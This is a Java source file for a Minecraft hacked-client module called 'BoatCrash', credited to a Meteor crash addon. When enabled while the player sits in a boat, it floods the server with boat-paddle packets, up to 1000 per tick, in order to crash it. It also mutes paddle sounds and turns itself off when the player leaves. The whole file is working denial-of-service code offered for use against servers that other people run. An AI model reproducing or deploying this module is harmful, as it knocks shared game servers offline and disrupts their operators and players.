package mathax.legacy.client.systems.modules.crash;

import mathax.legacy.client.eventbus.EventHandler;
import mathax.legacy.client.events.game.GameLeftEvent;
import mathax.legacy.client.events.world.PlaySoundEvent;
import mathax.legacy.client.events.world.TickEvent;
import mathax.legacy.client.settings.BoolSetting;
import mathax.legacy.client.settings.IntSetting;
import mathax.legacy.client.settings.Setting;
import mathax.legacy.client.settings.SettingGroup;
import mathax.legacy.client.systems.modules.Categories;
import mathax.legacy.client.systems.modules.Module;
import net.minecraft.entity.Entity;
import net.minecraft.entity.vehicle.BoatEntity;
import net.minecraft.item.Items;
import net.minecraft.network.packet.c2s.play.BoatPaddleStateC2SPacket;

/*/------------------------------------------------------------------------------------------------------------------------/*/
/*/ Used from Meteor Crash Addon by Wide Cat                                                                               /*/
/*/ https://github.com/Wide-Cat/meteor-crash-addon/blob/main/src/main/java/widecat/meteorcrashaddon/modules/BoatCrash.java /*/
/*/------------------------------------------------------------------------------------------------------------------------/*/

public class BoatCrash extends Module {
    private final BoatPaddleStateC2SPacket PACKET = new BoatPaddleStateC2SPacket(true, true);

    private final SettingGroup sgGeneral = settings.getDefaultGroup();

    private final Setting<Integer> amount = sgGeneral.add(new IntSetting.Builder()
        .name("amount")
        .description("How many packets to send to the server per tick.")
        .defaultValue(100)
        .min(1)
        .sliderRange(1, 1000)
        .build()
    );

    private final Setting<Boolean> noSound = sgGeneral.add(new BoolSetting.Builder()
        .name("no-sound")
        .description("Blocks the noisy paddle sounds.")
        .defaultValue(false)
        .build()
    );

    private final Setting<Boolean> autoDisable = sgGeneral.add(new BoolSetting.Builder()
        .name("auto-disable")
        .description("Disables the module on kick/leave.")
        .defaultValue(true)
        .build()
    );

    public BoatCrash() {
        super(Categories.Crash, Items.OAK_BOAT, "boat-crash", "Tries to crash the server when you are in a boat.");
    }

    @EventHandler
    private void onTick(TickEvent.Post event) {
        Entity boat = mc.player.getVehicle();
        if (!(boat instanceof BoatEntity)) {
            error("You must be in a boat, disabling...");
            toggle();
            return;
        }

        for (int i = 0; i < amount.get(); i++) {
            mc.getNetworkHandler().sendPacket(PACKET);
        }
    }

    @EventHandler
    private void onPlaySound(PlaySoundEvent event) {
        if (noSound.get() && event.sound.getId().toString().equals("minecraft:entity.boat.paddle_land") || event.sound.getId().toString().equals("minecraft:entity.boat.paddle_water")) event.cancel();
    }

    @EventHandler
    private void onGameLeft(GameLeftEvent event) {
        if (autoDisable.get()) toggle();
    }
}